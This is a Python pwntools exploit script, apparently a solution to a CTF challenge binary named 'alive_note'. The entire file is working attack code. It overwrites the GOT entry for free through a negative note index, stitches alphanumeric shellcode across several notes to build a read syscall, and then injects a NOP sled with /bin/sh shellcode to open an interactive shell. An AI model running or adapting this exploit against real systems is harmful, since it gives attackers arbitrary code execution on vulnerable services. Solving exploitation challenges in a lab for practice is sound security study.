#coding:utf-8
from pwn import *
if len(sys.argv) == 1:
    DEBUG = 1
else :
    DEBUG = 0
if DEBUG:
    io = process('./alive_note')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))
context(log_level='debug')
elf = ELF('alive_note')
def launch_gdb():
    #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(io)[0],'''
    b *0x080488EA
    ''')
def add(sc, idx):
    io.recvuntil(":")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.send(sc)
def delete(idx):
    io.recvuntil(":")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))
def padding():
    add("AAAAAAAA", -1)
    add("BBBBBBBB", -1)
    add("CCCCCCCC", -1)
offset = (elf.got["free"] - elf.symbols["note"]) / 4
# eax = buff, ebx = ecx = edx = 0
# create a read(0, buff, xxxx)
gdb.attach(io)
add("PYjAXE" "q8", offset)  # push eax ; pop ecx ; push 0x41 ; pop eax
padding()                   # => ecx = buff, eax = 0x41
add("4AHEEE" "q8", 0)       # xor al, 0x41 ; dec eax
padding()                   # => eax = 0xff
add("0AF49E" "q8", 1)       # xor [ecx+0x46], al ; xor al, 0x39
padding()                   # => 0xff ^ '2' = 0xcd, al ^= '9'
add("0AGjzZ" "q8", 2)       # xor [ecx+0x47], al ; push 0x7a ; pop edx
padding()                   # => 0xff ^ '9' ^ 'F' = 0x80, edx = 0x7a
add("j7X44E" "2F", 3)       # push 0x37 ; pop eax; xor al, 0x34 ; int 0x80
                            # => eax = 3
delete(2) # buff = address of note[2]
io.sendline("\x90" * 72 + asm(shellcraft.i386.linux.sh()))
io.interactive()

